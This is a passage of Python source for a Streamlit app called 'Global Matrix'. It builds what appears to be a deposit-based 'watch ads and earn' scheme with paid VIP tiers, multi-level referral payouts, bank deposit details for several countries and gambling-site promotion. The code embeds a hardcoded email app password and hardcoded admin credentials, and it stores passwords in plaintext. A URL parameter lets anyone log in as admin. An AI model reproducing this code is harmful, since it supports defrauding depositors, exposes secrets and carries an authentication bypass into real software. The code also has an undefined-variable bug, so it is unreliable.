import streamlit as st
import sqlite3
import random
import smtplib
import time
import streamlit.components.v1 as components
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ==============================================================================
# --- 1. SYSTEM INITIAL BLOCK & FRAMEWORK METRIC INITIALIZATION ---
# ==============================================================================
st.set_page_config(
    page_title="GLOBAL MATRIX", 
    page_icon=None, 
    layout="wide",
    initial_sidebar_state="collapsed"
)

SENDER_EMAIL = "globalmatrixteam.com@gmail.com"
SENDER_APP_PASSWORD = "higjqwbtxagmvdty"

# Complete Regional Banks Array Matrix Configuration (PAKISTAN REMOVED)
SUPPORTED_COUNTRIES = {
    "India": {
        "currency": "INR", 
        "symbol": "₹", 
        "banks": ["UPI Gateway", "Paytm Wallet", "State Bank of India", "HDFC Bank"],
        "details": {
            "UPI Gateway": {"title": "Global Matrix India UPI Node", "num": "matrixnode@upi"},
            "Paytm Wallet": {"title": "Global Matrix India Merchant Wallet", "num": "9876543210@paytm"},
            "State Bank of India": {"title": "Global Matrix IN SBI Pool Account", "num": "5647382910293"},
            "HDFC Bank": {"title": "Global Matrix IN HDFC Premium Core", "num": "1029384756473"}
        }
    },
    "Dubai": {
        "currency": "AED", 
        "symbol": "DH", 
        "banks": ["Emirates NBD", "Mashreq Bank", "Dubai Islamic Bank"],
        "details": {
            "Emirates NBD": {"title": "Global Matrix UAE NBD Corp Node", "num": "AE1234567890123456789"},
            "Mashreq Bank": {"title": "Global Matrix UAE Mashreq Connection", "num": "AE9876543210987654321"},
            "Dubai Islamic Bank": {"title": "Global Matrix UAE DIB Exchange", "num": "AE1122334455667788990"}
        }
    },
    "Malaysia": {
        "currency": "MYR", 
        "symbol": "RM", 
        "banks": ["Maybank", "CIMB Bank", "Public Bank", "Touch n Go"],
        "details": {
            "Maybank": {"title": "Global Matrix MY Maybank Terminal", "num": "514012345678"},
            "CIMB Bank": {"title": "Global Matrix MY CIMB Core Node", "num": "706543210987"},
            "Public Bank": {"title": "Global Matrix MY Public Gateway", "num": "403219876543"},
            "Touch n Go": {"title": "Global Matrix MY TnG Merchant Wallet", "num": "0112345678"}
        }
    },
    "Saudi Arabia": {
        "currency": "SAR", 
        "symbol": "SR", 
        "banks": ["Al Rajhi Bank", "SNB AlAhli", "Riyad Bank"],
        "details": {
            "Al Rajhi Bank": {"title": "Global Matrix KSA Al Rajhi Vault", "num": "SA1234567890000001234"},
            "SNB AlAhli": {"title": "Global Matrix KSA SNB Digital Central", "num": "SA9876543210000004321"},
            "Riyad Bank": {"title": "Global Matrix KSA Riyad Gateway Node", "num": "SA1122334455000009999"}
        }
    }
}

VIP_LEVELS = {
    "SVIP LEVEL 1": {"price": 0.0, "ad_pay": 0.50},
    "SVIP LEVEL 2": {"price": 100.0, "ad_pay": 2.00},
    "SVIP LEVEL 3": {"price": 300.0, "ad_pay": 5.00},
    "SVIP LEVEL 4": {"price": 1000.0, "ad_pay": 15.00},
    "SVIP LEVEL 5": {"price": 3000.0, "ad_pay": 50.00}
}

MEGA888_PORTAL_URL = "https://mega888tm.com/"

def send_verification_email(receiver_email, otp_code, purpose="Registration"):
    msg = MIMEMultipart()
    msg['From'] = f"Global Matrix <{SENDER_EMAIL}>"
    msg['To'] = receiver_email
    msg['Subject'] = f"Verification Code: {otp_code}"
    
    body = f"""
    <html>
    <body style="font-family: Arial, sans-serif; background-color: #05070b; padding: 20px; color: #ffffff;">
        <div style="max-width: 400px; margin: 0 auto; background: #0e131f; border: 2px solid #ffd700; border-radius: 16px; padding: 25px; text-align: center; box-shadow: 0 0 20px rgba(255,215,0,0.2);">
            <h2 style="color: #ffd700; margin-bottom: 10px; font-weight: 700;">GLOBAL MATRIX</h2>
            <hr style="border: 0; height: 1px; background: rgba(255,215,0,0.2); margin-bottom: 20px;">
            <p style="font-size: 16px; color: #ffffff;">Your OTP code for {purpose} is:</p>
            <div style="font-size: 32px; font-weight: bold; color: #ffffff; letter-spacing: 4px; padding: 12px; background: #05070b; border: 1px solid #ffd700; border-radius: 10px; margin: 20px 0;">
                {otp_code}
            </div>
            <p style="color: #8a99ad; font-size: 12px;">Do not share this code with anyone.</p>
        </div>
    </body>
    </html>
    """
    msg.attach(MIMEText(body, 'html'))

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=15)
        server.login(SENDER_EMAIL, SENDER_APP_PASSWORD)
        server.sendmail(SENDER_EMAIL, receiver_email, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_APP_PASSWORD)
            server.sendmail(SENDER_EMAIL, receiver_email, msg.as_string())
            server.quit()
            return True
        except Exception as e2:
            st.session_state["smtp_error_log"] = f"SSL Error: {e} | TLS Error: {e2}"
            return False

# ==============================================================================
# --- 2. LOCAL DATA STORAGE AND PERSISTENCE ENGINE INITIALIZATION ---
# ==============================================================================
def init_db():
    conn = sqlite3.connect("matrix_vault.db", check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY, password TEXT, balance REAL, liquidation REAL,
            active_level TEXT, ref_code TEXT, referred_by TEXT, selected_country TEXT
        )
    """)
    cursor.execute("CREATE TABLE IF NOT EXISTS system_config (key TEXT PRIMARY KEY, value TEXT)")
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS regional_banks (
            country TEXT PRIMARY KEY, bank_name TEXT, account_title TEXT, account_number TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS deposits (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, bank TEXT, name TEXT,
            trx_id TEXT, amount REAL, status TEXT, country TEXT
        )
    """)
    cursor.execute("CREATE TABLE IF NOT EXISTS checkins (username TEXT, date TEXT, PRIMARY KEY (username, date))")
    cursor.execute("CREATE TABLE IF NOT EXISTS ad_logs (username TEXT, ad_id TEXT, date TEXT, PRIMARY KEY (username, ad_id, date))")
    cursor.execute("CREATE TABLE IF NOT EXISTS lucky_spins (username TEXT, date TEXT, prize REAL, PRIMARY KEY (username, date))")
    cursor.execute("CREATE TABLE IF NOT EXISTS withdrawals (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, bank TEXT, account TEXT, amount REAL, status TEXT, country TEXT)")
    cursor.execute("CREATE TABLE IF NOT EXISTS ad_campaigns (id INTEGER PRIMARY KEY AUTOINCREMENT, advertiser_email TEXT, video_url TEXT, target_views INTEGER, trx_id TEXT, status TEXT)")
    
    try: cursor.execute("ALTER TABLE users ADD COLUMN referred_by TEXT")
    except sqlite3.OperationalError: pass
    try: cursor.execute("ALTER TABLE users ADD COLUMN selected_country TEXT")
    except sqlite3.OperationalError: pass
    try: cursor.execute("ALTER TABLE deposits ADD COLUMN country TEXT")
    except sqlite3.OperationalError: pass
    try: cursor.execute("ALTER TABLE withdrawals ADD COLUMN country TEXT")
    except sqlite3.OperationalError: pass

    configs = [
        ('ad1_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad1_reward', '3.00'),
        ('ad2_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad2_reward', '2.30'),
        ('ad3_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad3_reward', '4.50'),
        ('ad4_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad4_reward', '1.50'),
        ('ad5_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad5_reward', '2.00'),
        ('usdt_address', 'TYcc7p18K2YnQp87bXzNWXAsgWqR54321A'),
        ('system_announcement', 'Welcome to Global Matrix Terminal. Select country inside configurations panel to view details.'),
        ('unclaimed_rewards_val', '15.00'), ('vip1_income', '2.00'), ('vip2_income', '15.00'), ('vip3_income', '50.00'),
        ('vip2_req', '100.00'), ('vip3_req', '300.00')
    ]
    for key, val in configs:
        cursor.execute("INSERT OR IGNORE INTO system_config VALUES (?, ?)", (key, val))
        
    default_banks = [
        ('India', 'SBI Bank / UPI Gateway', 'Global Matrix IN Node', 'matrix@upi'),
        ('Dubai', 'Emirates NBD Terminal', 'Global Matrix UAE Node', 'AE1234567890123456789'),
        ('Malaysia', 'Maybank Berhad Network', 'Global Matrix MY Node', '514012345678'),
        ('Saudi Arabia', 'Al Rajhi Bank Connection', 'Global Matrix KSA Node', 'SA1234567890000001234')
    ]
    for cntry, b_name, a_title, a_num in default_banks:
        cursor.execute("INSERT OR IGNORE INTO regional_banks VALUES (?, ?, ?, ?)", (cntry, b_name, a_title, a_num))
        
    cursor.execute("INSERT OR IGNORE INTO users VALUES ('admin', 'admin123', 0.0, 0.0, 'OWNER', 'MASTER', '', 'India')")
    conn.commit()
    conn.close()

def query_db(query, args=(), one=False, commit=False):
    conn = sqlite3.connect("matrix_vault.db", check_same_thread=False)
    cursor = conn.cursor()
    try:
        cursor.execute(query, args)
        if commit:
            conn.commit()
            conn.close()
            return True
        rv = cursor.fetchall()
        conn.close()
        return (rv[0] if rv else None) if one else rv
    except Exception as e:
        conn.close()
        st.error(f"Database Core Exception: {e}")
        return None if one else []

init_db()

# ==============================================================================
# --- 3. REFERRAL COMMISSION CALCULATIONS ENGINE ---
# ==============================================================================
def credit_multi_tier_commissions(user, base_reward):
    tier_1_parent = query_db("SELECT referred_by FROM users WHERE username=?", (user,), one=True)
    if not tier_1_parent or not tier_1_parent[0]: return
    p1 = tier_1_parent[0]
    query_db("UPDATE users SET balance = balance + ? WHERE username=?", (base_reward * 0.10, p1), commit=True)
    
    tier_2_parent = query_db("SELECT referred_by FROM users WHERE username=?", (p1,), one=True)
    if not tier_2_parent or not tier_2_parent[0]: return
    p2 = tier_2_parent[0]
    query_db("UPDATE users SET balance = balance + ? WHERE username=?", (base_reward * 0.05, p2), commit=True)
    
    tier_3_parent = query_db("SELECT referred_by FROM users WHERE username=?", (p2,), one=True)
    if not tier_3_parent or not tier_3_parent[0]: return
    p3 = tier_3_parent[0]
    query_db("UPDATE users SET balance = balance + ? WHERE username=?", (base_reward * 0.02, p3), commit=True)

# ==============================================================================
# --- 4. SESSION SYSTEM DATA REGISTRY STORAGE ---
# ==============================================================================
if 'logged_in' not in st.session_state:
    if 'persisted_user' in st.query_params:
        p_user = st.query_params['persisted_user']
        if p_user in ["Mani", "admin"]:
            st.session_state.logged_in = True
            st.session_state.current_user = p_user
            st.session_state.is_admin = True
            st.session_state.selected_panel = "Pending Requests"
        else:
            record = query_db("SELECT username FROM users WHERE username=?", (p_user,), one=True)
            if record:
                st.session_state.logged_in = True
                st.session_state.current_user = record[0]
                st.session_state.is_admin = False
                st.session_state.selected_panel = "Overview"
            else: st.session_state.logged_in = False
    else: st.session_state.logged_in = False

session_keys = {
    'current_user': "", 'is_admin': False, 'selected_panel': "Overview", 
    'auth_mode': "Login", 'reset_step': 1, 'otp_start_time': None, 
    'reg_verify_code': "", 'temp_reg_ref': "", 'user_country': "India"
}
for key, def_val in session_keys.items():
    if key not in st.session_state:
        st.session_state[key] = def_val


def render_otp_countdown_engine():
    if st.session_state.otp_start_time:
        elapsed = time.time() - st.session_state.otp_start_time
        remaining = max(0, 120 - int(elapsed))
        if remaining > 0:
            st.markdown(f"<div style='text-align:center; color:#ffc107; font-size:13px; font-weight:600; margin-top:10px;'>OTP Validity Remaining: {remaining} seconds</div>", unsafe_allow_html=True)
        else:
            st.markdown("<div style='text-align:center; color:#dc3545; font-size:13px; font-weight:600; margin-top:10px;'>OTP Token Expired. Please Request Again.</div>", unsafe_allow_html=True)

# ==============================================================================
# --- 5. FIXED PREMIUM MEGA888 CUSTOM CASINO STYLING & RUNNING LINE ---
# ==============================================================================
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
footer, .stDeployButton, #MainMenu, [data-testid="stStatusWidget"], [data-testid="stHeader"] {
    display: none !important; visibility: hidden !important;
}

/* Premium VIP888/99Games Real Casino Luxe Look */
html, body, .stApp { 
    background: linear-gradient(180deg, #070e1e 0%, #0c1833 100%) !important; 
    color: #f1f5f9 !important; 
    font-family: 'Inter', sans-serif !important; 
}
[data-testid="stVerticalBlock"] { 
    max-width: 480px !important; 
    margin: 0 auto !important; 
    padding: 16px !important; 
    background: #101f42 !important; 
    border-radius: 12px !important; 
    border: 1px solid #1e366a !important; 
    box-shadow: 0 10px 40px rgba(0,0,0,0.6) !important; 
}

/* Top Header Running Line */
.running-header-container { 
    width: 100%; 
    background: #091326; 
    padding: 8px 0; 
    margin-bottom: 15px; 
    text-align: center; 
    overflow: hidden; 
    border-bottom: 2px solid #dfb01a; 
}
.running-text { 
    font-family: 'Inter', sans-serif; 
    font-size: 12px; 
    font-weight: 700; 
    color: #ffd700; 
    display: inline-block; 
    white-space: nowrap; 
    animation: marquee 16s linear infinite; 
}

@keyframes marquee {
    0% { transform: translate3d(100%, 0, 0); }
    100% { transform: translate3d(-100%, 0, 0); }
}

.brand-title { 
    text-align: center; 
    font-family: 'Inter', sans-serif; 
    font-size: 34px; 
    font-weight: 800; 
    color: #ffffff; 
    margin-top: 10px; 
    letter-spacing: 2px; 
    text-shadow: 0 0 15px rgba(255,215,0,0.4); 
}
.brand-subtitle { 
    text-align: center; 
    font-family: 'Inter', sans-serif; 
    font-size: 13px; 
    font-weight: 500; 
    color: #a0aec0; 
    margin-bottom: 25px; 
    text-transform: uppercase; 
}

/* Mega888 True Layout Top Category Filter Tabs Row */
.mega-category-row { display: flex; gap: 10px; margin-bottom: 15px; }
.mega-tab-btn { 
    flex: 1; 
    background: #172b54; 
    padding: 12px; 
    border-radius: 8px; 
    text-align: center; 
    font-weight: 700; 
    font-size: 14px; 
    color: #a4bde6; 
    border: 1px solid #233f78; 
}
.mega-tab-btn.active { 
    background: linear-gradient(180deg, #dfb01a 0%, #a67c00 100%); 
    color: #000000; 
    border: 1px solid #ffea85; 
    box-shadow: 0 4px 10px rgba(223,176,26,0.3); 
}

/* Dynamic Slider Graphics Card Container */
.mega-slider-box {
    width: 100%; 
    background: linear-gradient(90deg, #8a1818 0%, #bd2a2a 50%, #8a1818 100%);
    border-radius: 10px; 
    padding: 25px 15px; 
    text-align: center; 
    font-weight: 800; 
    font-size: 24px;
    color: #ffd700; 
    text-transform: uppercase; 
    letter-spacing: 1px; 
    margin-bottom: 15px;
    border: 1px solid #e03636; 
    text-shadow: 0 2px 4px rgba(0,0,0,0.6); 
    position: relative;
}
.mega-slider-dots { display: flex; justify-content: center; gap: 6px; margin-top: 10px; }
.mega-slider-dot { width: 18px; height: 18px; border-radius: 50%; background: #0c1833; color: #fff; font-size: 10px; line-height: 18px; text-align: center; font-weight: 700; }
.mega-slider-dot.active { background: #dfb01a; color:#000; }

/* Our Products Container Section Header Label */
.section-title-label { font-size: 15px; font-weight: 700; color: #dfb01a; margin: 15px 0 10px 2px; text-transform: uppercase; letter-spacing: 0.5px; }

/* Product Choti-Choti Pic Icons Grid Restructuring Layout */
.mega-products-container {
    background: #0b1426; 
    border-radius: 10px; 
    padding: 15px; 
    border: 1px solid #1c325c; 
    margin-bottom: 20px;
}
.mega-products-grid {
    display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; justify-items: center; align-items: center;
}
.casino-mini-logo {
    width: 100%; 
    background: linear-gradient(180deg, #1d335c 0%, #11203b 100%);
    border-radius: 8px; 
    padding: 12px 4px; 
    text-align: center; 
    border: 1px solid #294780;
    box-shadow: 0 4px 8px rgba(0,0,0,0.4); 
    transition: 0.2s; 
    text-decoration: none; 
    display: block;
}
.casino-mini-logo:hover { transform: scale(1.05); border-color: #dfb01a; }
.casino-mini-text { font-size: 10px; font-weight: 800; color: #ffffff; text-transform: uppercase; letter-spacing: 0.3px; line-height: 1.2; margin-top: 2px; word-break: break-word; }

/* Special Sponsored Massive Display Ad Layout Block Frame */
.sponsored-card-block {
    background: #0b1426; border-radius: 10px; border: 1px solid #1c325c; overflow: hidden; margin-bottom: 12px; padding-bottom: 15px;
}
.sponsored-image-canvas {
    width: 100%; height: 180px; background: linear-gradient(135deg, #201335 0%, #0f081c 100%);
    position: relative; display: flex; flex-direction: column; justify-content: center; align-items: center; border-bottom: 1px solid #1c325c;
}
.sponsored-claim-badge {
    position: absolute; top: 12px; left: 12px; background: #28a745; color: #ffffff;
    font-size: 12px; font-weight: 700; padding: 5px 16px; border-radius: 4px; text-transform: capitalize; box-shadow: 0 2px 5px rgba(0,0,0,0.3);
}
.sponsored-meta-row { padding: 12px 15px; }
.sponsored-brand-tag { display: flex; align-items: center; gap: 8px; font-weight: 700; color: #ffffff; font-size: 14px; margin-bottom: 4px; }
.sponsored-brand-icon { width: 24px; height: 24px; background: #dfb01a; border-radius: 50%; font-size: 11px; line-height: 24px; text-align: center; font-weight: 800; color:#000; }
.sponsored-main-heading { font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 2px; }
.sponsored-desc-sub { font-size: 13px; color: #dfb01a; font-weight: 600; }

/* Custom Overwrites for Buttons and Inputs */
div[data-testid="stTextInput"] input, div[data-testid="stNumberInput"] input, div[data-testid="stSelectbox"] div[data-baseweb="select"] {
    background-color: #0b1426 !important; color: #ffffff !important; border: 1px solid #1c325c !important; border-radius: 8px !important;
    padding: 10px !important; font-size: 14px !important; font-weight: 600 !important;
}
div.stButton > button {
    background: linear-gradient(180deg, #dfb01a 0%, #a67c00 100%) !important; color: #000000 !important; font-family: 'Inter', sans-serif;
    font-size: 13px !important; font-weight: 800; border-radius: 8px !important; width: 100% !important; padding: 12px !important; border: none !important;
    text-transform: uppercase; box-shadow: 0 4px 12px rgba(223,176,26,0.3);
}
div.stButton > button:hover { transform: scale(1.02); background: linear-gradient(180deg, #ffea85 0%, #dfb01a 100%) !important; }

/* Premium Bank Details Card Dashboard Design Elements */
.premium-bank-detail-card {
    background: linear-gradient(135deg, #11203e 0%, #0a1426 100%) !important;
    border: 1px solid #1d3668 !important;
    border-radius: 10px !important;
    padding: 16px !important;
    margin-bottom: 15px !important;
}
.bank-line-row {
    display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px;
}
.bank-line-label { color: #a4bde6; font-weight: 600; }
.bank-line-value { color: #ffffff; font-weight: 700; }

/* Highlighted Country Selector Border Block Custom Component */
.highlight-country-selector-box {
    border: 2px dashed #dfb01a !important;
    background-color: #0c1833 !important;
    border-radius: 10px !important;
    padding: 15px !important;
    margin: 15px 0 !important;
    box-shadow: 0 0 15px rgba(223,176,26,0.2) !important;
}
.highlight-country-label {
    font-size: 12px; font-weight: 800; color: #dfb01a; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px;
}

.app-grid-coral { background: linear-gradient(135deg, #bd2a2a 0%, #781313 100%) !important; border-radius: 10px; padding: 16px; color: #ffffff !important; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
.app-grid-purple { background: linear-gradient(135deg, #1c6e44 0%, #0f4026 100%) !important; border-radius: 10px; padding: 16px; color: #ffffff !important; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }

.announcement-box { background: #0b1426; border: 1px solid #1c325c; border-radius: 8px; padding: 12px; font-size: 13px; color: #a4bde6 !important; text-align: center; font-weight: 500; margin-bottom: 15px; }

label { color: #a4bde6 !important; font-family: 'Inter', sans-serif !important; font-size: 11px !important; font-weight: 700 !important; text-transform: uppercase; letter-spacing: 0.5px; }
</style>
""", unsafe_allow_html=True)

announcement_text = query_db("SELECT value FROM system_config WHERE key='system_announcement'", one=True)[0]
usdt_address = query_db("SELECT value FROM system_config WHERE key='usdt_address'", one=True)[0]

# ==============================================================================
# --- 7. PUBLIC FRONT-END LOBBY ENGINE (SHOWS TO EVERYONE BEFORE LOGIN) ---
# ==============================================================================
# Real Mega888 Top Category Selection Row (1000065625.jpg alignment)
st.markdown("""
<div class="mega-category-row">
    <div class="mega-tab-btn active">Games</div>
    <div class="mega-tab-btn">Sponsored</div>
</div>
""", unsafe_allow_html=True)

# Upper Dynamic Carousel Graphics Banner
st.markdown("""
<div class="mega-slider-box">
    SLOT GAMES
    <div class="mega-slider-dots">
        <div class="mega-slider-dot">1</div>
        <div class="mega-slider-dot active">2</div>
        <div class="mega-slider-dot">3</div>
    </div>
</div>
""", unsafe_allow_html=True)

# --- "OUR PRODUCTS" CHOTI PIC GRID LAYOUT VIA HTML DIRECT LIVE LINKS ---
st.markdown('<div class="section-title-label">Our Products</div>', unsafe_allow_html=True)
st.markdown(f"""
<div class="mega-products-container">
    <div class="mega-products-grid">
        <a href="{MEGA888_PORTAL_URL}" target="_blank" class="casino-mini-logo"><div class="casino-mini-text">DRAGON<br>TIGER</div></a>
        <a href="{MEGA888_PORTAL_URL}" target="_blank" class="casino-mini-logo"><div class="casino-mini-text">FISHING<br>STAR</div></a>
        <a href="{MEGA888_PORTAL_URL}" target="_blank" class="casino-mini-logo"><div class="casino-mini-text">CLASH OF<br>BEASTS</div></a>
        <a href="{MEGA888_PORTAL_URL}" target="_blank" class="casino-mini-logo"><div class="casino-mini-text">SUSHI<br>OISHI</div></a>
        <a href="{MEGA888_PORTAL_URL}" target="_blank" class="casino-mini-logo"><div class="casino-mini-text">CELEBRATE<br>WEALTH</div></a>
        <a href="{MEGA888_PORTAL_URL}" target="_blank" class="casino-mini-logo"><div class="casino-mini-text">MONKEY<br>THUNDER</div></a>
        <a href="{MEGA888_PORTAL_URL}" target="_blank" class="casino-mini-logo"><div class="casino-mini-text">BEAST<br>WEALTH</div></a>
        <a href="{MEGA888_PORTAL_URL}" target="_blank" class="casino-mini-logo"><div class="casino-mini-text">AGENT<br>51</div></a>
    </div>
</div>
""", unsafe_allow_html=True)

# --- SPECIAL SPONSORED ADS PACKAGES SECTION ---
st.markdown('<div class="section-title-label">Our Special Sponsored</div>', unsafe_allow_html=True)
st.markdown("""
<div class="sponsored-card-block">
    <div class="sponsored-image-canvas">
        <div class="sponsored-claim-badge">Claim</div>
        <div style="font-size:42px;">🎰</div>
        <div style="font-weight:800; font-size:16px; color:#ffd700; margin-top:10px;">918KISS MEGA BONUS WHEEL</div>
    </div>
    <div class="sponsored-meta-row">
        <div class="sponsored-brand-tag"><div class="sponsored-brand-icon">💋</div> JomKiss3</div>
        <div class="sponsored-main-heading">JomKiss: 918Kiss & Mega888 Company</div>
        <div class="sponsored-desc-sub">Agency Company Premium Loop</div>
    </div>
</div>
""", unsafe_allow_html=True)

# Directly Redirecting Core Click Navigation Protocol
st.markdown(f'<a href="{MEGA888_PORTAL_URL}" target="_blank" style="text-decoration:none;"><button style="background: linear-gradient(180deg, #dfb01a 0%, #a67c00 100%) !important; color: #000000; font-family: \'Inter\', sans-serif; font-size: 13px !important; font-weight: 800; border-radius: 6px !important; width: 100% !important; padding: 11px !important; border: none !important; text-transform: uppercase; margin-bottom:20px; cursor:pointer;">PLAY NOW & HARVEST BONUS</button></a>', unsafe_allow_html=True)

st.markdown("<hr style='border-color:#1c325c; margin: 25px 0;'>", unsafe_allow_html=True)

# ==============================================================================
# --- 8. GATEWAY ENTRY FORMS SYSTEM SECURITY AUTHENTICATION SHIELDS ---
# ==============================================================================
if not st.session_state.logged_in:
    st.markdown('<div class="brand-title">GLOBAL MATRIX SYSTEM</div>', unsafe_allow_html=True)
    
    if st.session_state.auth_mode == "Login":
        st.markdown('<div class="brand-subtitle">Account Sign In</div>', unsafe_allow_html=True)
        username = st.text_input("Gmail Address:", placeholder="user@gmail.com", key="login_user_input")
        password = st.text_input("Password:", type="password", placeholder="••••••••", key="login_pass_input")
        st.markdown("<div style='margin-top:15px;'></div>", unsafe_allow_html=True)
        
        if st.button("LOGIN TO MATRIX", use_container_width=True, key="execute_login_btn"):
            if username.strip() and password.strip():
                u_clean = username.strip()
                p_clean = password.strip()
                
                if (u_clean == "Mani" and p_clean == "MANI2662") or (u_clean == "admin" and p_clean == "admin123"):
                    st.session_state.logged_in = True
                    st.session_state.current_user = u_clean
                    st.session_state.is_admin = True
                    st.session_state.selected_panel = "Pending Requests"
                    st.query_params['persisted_user'] = u_clean
                    st.rerun()
                else:
                    record = query_db("SELECT password, username, selected_country FROM users WHERE username=?", (u_clean,), one=True)
                    if record and record[0] == p_clean:
                        st.session_state.logged_in = True
                        st.session_state.current_user = record[1]
                        st.session_state.is_admin = False
                        st.session_state.user_country = record[2] if record[2] else "India"
                        st.session_state.selected_panel = "Overview"
                        st.query_params['persisted_user'] = record[1]
                        st.rerun()
                    else: st.error("Error: Invalid credentials configuration alignment.")
                        
    elif st.session_state.auth_mode == "Register":
        st.markdown('<div class="brand-subtitle">Create Account Vault</div>', unsafe_allow_html=True)
        reg_username = st.text_input("Gmail Address:", placeholder="example@gmail.com", key="reg_user_input")
        reg_password = st.text_input("Choose Password:", type="password", key="reg_pass_input")
        reg_ref_code = st.text_input("Referral Code (Optional):", placeholder="Optional reference hash", key="reg_ref_input")
        reg_country = st.selectbox("Select Country:", list(SUPPORTED_COUNTRIES.keys()), key="reg_country_select")
        st.markdown("<div style='margin-top:15px;'></div>", unsafe_allow_html=True)
        
        if st.button("SEND OTP PACKET", use_container_width=True, key="submit_registration_btn"):
            if reg_username.strip() and reg_password.strip():
                if "@" not in reg_username or "." not in reg_username:
                    st.error("Invalid email syntax structure.")
                else:
                    existing = query_db("SELECT username FROM users WHERE username=?", (reg_username.strip(),), one=True)
                    if existing: st.error("This email identity is currently occupied.")
                    else:
                        generated_otp = str(random.randint(102938, 984731))
                        st.toast("Connecting to servers...")
                        if send_verification_email(reg_username.strip(), generated_otp, purpose="Account Creation"):
                            st.session_state.temp_reg_user = reg_username.strip()
                            st.session_state.temp_reg_pass = reg_password.strip()
                            st.session_state.temp_reg_ref = reg_ref_code.strip()
                            st.session_state.temp_reg_country = reg_country
                            st.session_state.reg_verify_code = generated_otp
                            st.session_state.otp_start_time = time.time()
                            st.session_state.auth_mode = "VerifyNewAccount"
                            st.success("Verification packet sent. Please check your Gmail.")
                            st.rerun()
                        else:
                            err = st.session_state.get("smtp_error_log", "Gmail routing firewall error.")
                            st.error(f"Gateway Interrupted: {err}")
                        
    elif st.session_state.auth_mode == "VerifyNewAccount":
        st.markdown('<div class="brand-subtitle">Sync Protection Key</div>', unsafe_allow_html=True)
        st.info(f"Target destination: {st.session_state.get('temp_reg_user','')}")
        
        typed_code = st.text_input("Enter OTP Code:", placeholder="******", key="otp_sync_input")
        st.markdown("<div style='margin-top:15px;'></div>", unsafe_allow_html=True)
        
        if st.button("VERIFY ACCOUNT SPACE", use_container_width=True, key="confirm_otp_btn"):
            if typed_code.strip() == st.session_state.reg_verify_code:
                starting_bonus = 2.00
                parent_user = ""
                if st.session_state.temp_reg_ref:
                    valid_ref = query_db("SELECT username FROM users WHERE ref_code=?", (st.session_state.temp_ref_code,), one=True)
                    if valid_ref:
                        starting_bonus += 40.00
                        parent_user = valid_ref[0]
                        
                query_db("INSERT INTO users VALUES (?, ?, ?, 0.00, 'SVIP LEVEL 1', 'M' || CAST(ABS(RANDOM()%10000) AS TEXT), ?, ?)", 
                         (st.session_state.temp_reg_user, st.session_state.temp_reg_pass, starting_bonus, parent_user, st.session_state.temp_reg_country), commit=True)
                st.success(f"Account validated successfully.")
                st.session_state.auth_mode = "Login"
                st.rerun()
            else: st.error("Verification Error: Discrepancy inside token values.")
        render_otp_countdown_engine()
        
    elif st.session_state.auth_mode == "ResetPassword":
        st.markdown('<div class="brand-subtitle">Reset Password Key</div>', unsafe_allow_html=True)
        reset_email = st.text_input("Enter Registered Email Account:", key="reset_email_input")
        if st.session_state.reset_step == 1:
            st.markdown("<div style='margin-top:15px;'></div>", unsafe_allow_html=True)
            if st.button("SEND PASSWORD RESET CODE", use_container_width=True, key="send_reset_otp_btn"):
                if reset_email.strip():
                    user_exist = query_db("SELECT username FROM users WHERE username=?", (reset_email.strip(),), one=True)
                    if user_exist:
                        generated_otp = str(random.randint(102938, 984731))
                        if send_verification_email(reset_email.strip(), generated_otp, purpose="Password Recovery Overwrite"):
                            st.session_state.recovery_target_user = reset_email.strip()
                            st.session_state.recovery_otp = generated_otp
                            st.session_state.reset_step = 2
                            st.rerun()
                        else: st.error("Transmission error inside email structures.")
                    else: st.error("No account matches specified records.")
                        
        elif st.session_state.reset_step == 2:
            st.markdown(f'<div class="premium-bank-detail-card"><span>Target Account:</span><br><b>{st.session_state.recovery_target_user}</b></div>', unsafe_allow_html=True)
            typed_otp = st.text_input("Enter Code:", key="recovery_otp_input")
            new_pass = st.text_input("New Password:", type="password", key="recovery_pass_input")
            st.markdown("<div style='margin-top:15px;'></div>", unsafe_allow_html=True)
            if st.button("OVERWRITE CREDENTIALS NOW", use_container_width=True, key="finalize_reset_btn"):
                if typed_otp.strip() == st.session_state.recovery_otp:
                    query_db("UPDATE users SET password=? WHERE username=?", (new_pass.strip(), st.session_state.recovery_target_user), commit=True)
                    st.success("Target credential edited cleanly.")
                    st.session_state.auth_mode = "Login"
                    st.session_state.reset_step = 1
                    st.rerun()
                else: st.error("Validation codes mismatch anomaly.")
                    
    st.markdown("<hr style='border-color:#1c325c; opacity:0.3;'>", unsafe_allow_html=True)
    c1, c2, c3 = st.columns(3)
    with c1:
        if st.button("Log In Panel", key="nav_switch_to_login"): st.session_state.auth_mode = "Login"; st.rerun()
    with c2:
        if st.button("Register Account", key="nav_switch_to_register"): st.session_state.auth_mode = "Register"; st.rerun()
    with c3:
        if st.button("Forgot Password", key="nav_switch_to_forget"): st.session_state.auth_mode = "ResetPassword"; st.session_state.reset_step = 1; st.rerun()

# ==============================================================================
# --- 9. SECURE DASHBOARD MANAGEMENT CORE PANELS (AFTER LOGIN) ---
# ==============================================================================
else:
    # --------------------------------------------------------------------------
